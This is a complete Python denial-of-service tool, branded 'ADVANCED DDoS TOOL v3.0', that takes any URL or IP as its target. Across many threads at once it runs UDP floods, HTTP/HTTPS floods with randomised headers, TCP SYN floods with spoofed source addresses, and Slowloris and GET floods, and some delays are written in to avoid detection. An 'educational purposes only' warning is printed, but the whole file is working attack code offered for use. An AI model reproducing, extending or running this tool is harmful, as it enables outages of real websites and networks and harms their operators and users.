#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import threading
import random
import os
import time
import sys
import requests
import struct
import ssl
import http.client
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor
from scapy.all import IP, TCP, send, RandShort
import colorama
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# ============ COLOR SETTINGS ============
class Colors:
    GREEN = Fore.GREEN
    RED = Fore.RED
    YELLOW = Fore.YELLOW
    BLUE = Fore.BLUE
    MAGENTA = Fore.MAGENTA
    CYAN = Fore.CYAN
    WHITE = Fore.WHITE
    RESET = Style.RESET_ALL
    BOLD = Style.BRIGHT

# ============ USER AGENTS ============
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 OPR/105.0.0.0',
    'Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/109.0 Firefox/121.0',
    'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36'
]

# ============ FAKE IPS ============
FAKE_IPS = [
    '192.165.6.6', '192.176.76.7', '192.156.6.6', '192.155.5.5', 
    '192.143.2.2', '188.142.141.4', '187.122.212.1', '192.153.4.4', 
    '192.154.32.4', '192.153.53.25', '192.154.54.5', '192.143.43.4', 
    '192.165.6.9', '188.154.54.3', '10.0.0.1', '172.16.0.1'
]

# ============ LOGO ============
LOGO = f"""
{Colors.MAGENTA}                                         _.oo.
                 _.u[[/;:,.         .odMMMMMM'
              .o888UU[[[/;:-.  .o@P^    MMM^
             oN88888UU[[[/;::-.        dP^
            dNMMNN888UU[[[/;:--.   .o@P^
           ,MMMMMMN888UU[[/;::-. o@^
           NNMMMNN888UU[[[/~.o@P^
           888888888UU[[[/o@^-..
          oI8888UU[[[/o@P^:--..
       .@^  YUU[[[/o@^;::---..
     oMP     ^/o@P^;:::---..
  .dMMM    .o@^ ^;::---...
 dMMMMMMM@^`       `^^^^
YMMMUP^
{Colors.CYAN}              ╔════════════════════════════════╗
              ║    🔥 ADVANCED DDoS TOOL v3.0 🔥   ║
              ║       Created by: MrSanZz         ║
              ║       Team: JogjaXploit           ║
              ╚════════════════════════════════════╝
{Colors.RESET}"""

# ============ MAIN ATTACK CLASS ============
class AdvancedDDoS:
    def __init__(self, target, port=None, threads=50, packet_size=65000, boost=False):
        self.target = target
        self.port = port
        self.threads = threads
        self.packet_size = packet_size
        self.boost = boost
        self.running = True
        self.packets_sent = 0
        self.lock = threading.Lock()
        self.host = None
        self.path = '/'
        self.scheme = 'http'
        
        # Parse target
        self.parse_target()
        
        # If no port specified, use default
        if not self.port:
            self.port = 443 if self.scheme == 'https' else 80
            
    def parse_target(self):
        """Parse URL or IP target"""
        if '://' not in self.target:
            self.target = 'http://' + self.target
            
        parsed = urlparse(self.target)
        self.host = parsed.hostname
        self.path = parsed.path or '/'
        self.scheme = parsed.scheme
        
        if not self.host:
            raise ValueError("Invalid target format!")
            
    def show_status(self):
        """Display attack status"""
        print(f"""
{Colors.YELLOW}╔═══════════════════════════════════════════╗
{Colors.CYAN}║     🚀 ATTACK STATUS 🚀                  ║
{Colors.YELLOW}╠═══════════════════════════════════════════╣
{Colors.GREEN}║  Target: {self.host}
{Colors.GREEN}║  Port: {self.port}
{Colors.GREEN}║  Threads: {self.threads}
{Colors.GREEN}║  Packet Size: {self.packet_size} bytes
{Colors.GREEN}║  Boost Mode: {'✅ Enabled' if self.boost else '❌ Disabled'}
{Colors.GREEN}║  Scheme: {self.scheme.upper()}
{Colors.YELLOW}╚═══════════════════════════════════════════╝{Colors.RESET}
        """)

    # ============ ATTACK METHODS ============
    
    def udp_flood(self):
        """UDP Flood Attack"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.settimeout(1)
            
            while self.running:
                try:
                    # Random packet size between 1000 and max
                    size = random.randint(1000, self.packet_size)
                    data = random._urandom(size)
                    
                    # Send to multiple ports
                    ports = [self.port]
                    if self.boost:
                        ports.extend([random.randint(1, 65535) for _ in range(3)])
                    
                    for p in ports:
                        sock.sendto(data, (self.host, p))
                        
                    with self.lock:
                        self.packets_sent += len(ports)
                        
                except socket.error:
                    continue
                    
        except Exception:
            pass
        finally:
            try:
                sock.close()
            except:
                pass

    def http_flood(self):
        """HTTP/HTTPS Flood Attack"""
        try:
            while self.running:
                try:
                    # Create connection
                    if self.scheme == 'https':
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        conn = http.client.HTTPSConnection(self.host, self.port, context=context, timeout=5)
                    else:
                        conn = http.client.HTTPConnection(self.host, self.port, timeout=5)
                    
                    # Random headers
                    headers = {
                        'User-Agent': random.choice(USER_AGENTS),
                        'Accept': '*/*',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Accept-Language': random.choice(['en-US,en;q=0.9', 'fa-IR,fa;q=0.9', 'ar-SA,ar;q=0.9']),
                        'Cache-Control': 'no-cache',
                        'Pragma': 'no-cache',
                        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                        'X-Real-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                        'Connection': random.choice(['keep-alive', 'close']),
                        'Referer': f"http://{random.choice(FAKE_IPS)}/",
                    }
                    
                    # Random HTTP methods
                    method = random.choice(['GET', 'POST', 'HEAD', 'PUT'])
                    
                    # Random path with params
                    path = self.path
                    if '?' not in path:
                        path += f"?_={random.randint(1,999999)}"
                    else:
                        path += f"&_={random.randint(1,999999)}"
                    
                    # POST data
                    if method == 'POST':
                        body = random._urandom(random.randint(10, 500))
                        headers['Content-Type'] = 'application/x-www-form-urlencoded'
                        conn.request(method, path, body=body, headers=headers)
                    else:
                        conn.request(method, path, headers=headers)
                    
                    # Get response and read it
                    response = conn.getresponse()
                    response.read()
                    conn.close()
                    
                    with self.lock:
                        self.packets_sent += 1
                        
                    # Small delay to avoid detection
                    if not self.boost:
                        time.sleep(random.uniform(0.001, 0.01))
                        
                except Exception:
                    continue
                finally:
                    try:
                        conn.close()
                    except:
                        pass
                        
        except Exception:
            pass

    def tcp_syn_flood(self):
        """TCP SYN Flood Attack"""
        try:
            while self.running:
                try:
                    # Create packet with spoofed IP
                    src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                    src_port = random.randint(1024, 65535)
                    
                    # Build IP and TCP layers
                    ip_layer = IP(src=src_ip, dst=self.host)
                    tcp_layer = TCP(
                        sport=src_port,
                        dport=self.port,
                        flags='S',
                        seq=random.randint(1000, 4294967295),
                        window=random.randint(1000, 65535)
                    )
                    
                    # Add TCP options
                    tcp_layer.options = [
                        ('MSS', 1460),
                        ('SAckOK', b''),
                        ('Timestamp', (random.randint(1, 999999), 0)),
                        ('NOP', None),
                        ('WScale', 7),
                    ]
                    
                    # Send packet
                    send(ip_layer/tcp_layer, verbose=0)
                    
                    with self.lock:
                        self.packets_sent += 1
                        
                except Exception:
                    continue
                    
        except Exception:
            pass

    def slow_loris(self):
        """Slow Loris Attack - Keep connections open"""
        if not self.boost:
            return
            
        try:
            sockets = []
            # Create initial connections
            for _ in range(min(200, self.threads * 4)):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(10)
                    sock.connect((self.host, self.port))
                    sock.send(f"GET {self.path} HTTP/1.1\r\n".encode())
                    sock.send(f"User-Agent: {random.choice(USER_AGENTS)}\r\n".encode())
                    sock.send(f"Host: {self.host}\r\n".encode())
                    sockets.append(sock)
                except:
                    continue
            
            # Keep connections alive
            while self.running:
                for sock in sockets[:]:
                    try:
                        # Send partial headers periodically
                        sock.send(f"X-Header-{random.randint(1,999)}: {random.randint(1,9999)}\r\n".encode())
                        time.sleep(random.uniform(1, 5))
                    except:
                        # Reconnect if connection lost
                        sockets.remove(sock)
                        try:
                            new_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            new_sock.connect((self.host, self.port))
                            sockets.append(new_sock)
                        except:
                            pass
                            
                with self.lock:
                    self.packets_sent += len(sockets)
                    
        except Exception:
            pass

    def http_get_flood(self):
        """HTTP GET Flood with requests library"""
        try:
            session = requests.Session()
            
            while self.running:
                try:
                    # Random headers
                    headers = {
                        'User-Agent': random.choice(USER_AGENTS),
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Accept-Language': 'en-US,en;q=0.9',
                        'Cache-Control': 'no-cache',
                        'Pragma': 'no-cache',
                        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                    }
                    
                    url = f"{self.scheme}://{self.host}:{self.port}{self.path}"
                    if '?' not in self.path:
                        url += f"?_={random.randint(1,999999)}"
                    
                    if self.scheme == 'https':
                        session.get(url, headers=headers, timeout=5, verify=False)
                    else:
                        session.get(url, headers=headers, timeout=5)
                    
                    with self.lock:
                        self.packets_sent += 1
                        
                except Exception:
                    continue
                    
        except Exception:
            pass

    # ============ START ATTACK ============
    def start(self):
        """Start all attack threads"""
        self.show_status()
        
        print(f"{Colors.YELLOW}⚠️  WARNING: This tool is for educational purposes only!{Colors.RESET}")
        print(f"{Colors.RED}⚠️  Do not use against targets without authorization!{Colors.RESET}")
        print(f"{Colors.CYAN}💡 Press Ctrl+C to stop the attack{Colors.RESET}\n")
        
        input(f"{Colors.GREEN}Press Enter to start the attack...{Colors.RESET}")
        
        # Clear screen
        os.system('clear' if os.name == 'posix' else 'cls')
        print(LOGO)
        print(f"{Colors.GREEN}🚀 Attack started!{Colors.RESET}\n")
        
        # Start attack threads
        attack_threads = []
        start_time = time.time()
        
        # Distribute threads among attack types
        with ThreadPoolExecutor(max_workers=self.threads * 3) as executor:
            # Submit attacks
            for _ in range(self.threads):
                attack_threads.append(executor.submit(self.udp_flood))
                attack_threads.append(executor.submit(self.http_flood))
                attack_threads.append(executor.submit(self.tcp_syn_flood))
                if self.boost:
                    attack_threads.append(executor.submit(self.slow_loris))
                    attack_threads.append(executor.submit(self.http_get_flood))
            
            # Show statistics
            try:
                while self.running:
                    time.sleep(3)
                    elapsed = time.time() - start_time
                    with self.lock:
                        packets = self.packets_sent
                        speed = packets / elapsed if elapsed > 0 else 0
                        print(f"{Colors.CYAN}[{time.strftime('%H:%M:%S')}] {Colors.GREEN}Packets: {packets:,} {Colors.YELLOW}| Speed: {speed:,.0f} p/s {Colors.CYAN}| Active Threads: {len(attack_threads)}{Colors.RESET}")
                        
                        # Reset counter every minute
                        if elapsed > 60:
                            self.packets_sent = 0
                            start_time = time.time()
                            
            except KeyboardInterrupt:
                self.running = False
                print(f"\n{Colors.YELLOW}🛑 Stopping attack...{Colors.RESET}")
                time.sleep(2)
                print(f"{Colors.GREEN}✅ Attack stopped!{Colors.RESET}")
                print(f"{Colors.CYAN}📊 Total packets sent: {self.packets_sent:,}{Colors.RESET}")

# ============ MAIN FUNCTION ============
def main():
    """Main function"""
    # Clear screen
    os.system('clear' if os.name == 'posix' else 'cls')
    
    # Show logo
    print(LOGO)
    
    try:
        # Get target information
        print(f"{Colors.WHITE}╔═══════════════════════════════════════════╗")
        print(f"{Colors.WHITE}║           CONFIGURATION                   ║")
        print(f"{Colors.WHITE}╚═══════════════════════════════════════════╝{Colors.RESET}")
        
        target = input(f"{Colors.CYAN}📌 Target (URL or IP): {Colors.WHITE}")
        if not target:
            raise ValueError("Target cannot be empty!")
            
        port_input = input(f"{Colors.CYAN}🔌 Port (default: auto): {Colors.WHITE}")
        port = int(port_input) if port_input else None
        
        packet_input = input(f"{Colors.CYAN}📦 Packet Size (default: 65000): {Colors.WHITE}")
        packet_size = int(packet_input) if packet_input else 65000
        
        thread_input = input(f"{Colors.CYAN}🧵 Threads (default: 50): {Colors.WHITE}")
        threads = int(thread_input) if thread_input else 50
        
        boost_input = input(f"{Colors.CYAN}⚡ Boost Mode (y/n): {Colors.WHITE}").lower()
        boost = boost_input == 'y' or boost_input == 'yes'
        
        # Create attack object
        attack = AdvancedDDoS(target, port, threads, packet_size, boost)
        
        # Start attack
        attack.start()
        
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}🛑 Exiting...{Colors.RESET}")
        sys.exit(0)
        
    except ValueError as e:
        print(f"{Colors.RED}❌ Error: {e}{Colors.RESET}")
        time.sleep(3)
        
    except Exception as e:
        print(f"{Colors.RED}❌ Unexpected error: {e}{Colors.RESET}")
        time.sleep(3)

# ============ RUN ============
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}🛑 Exiting...{Colors.RESET}")
        sys.exit(0)
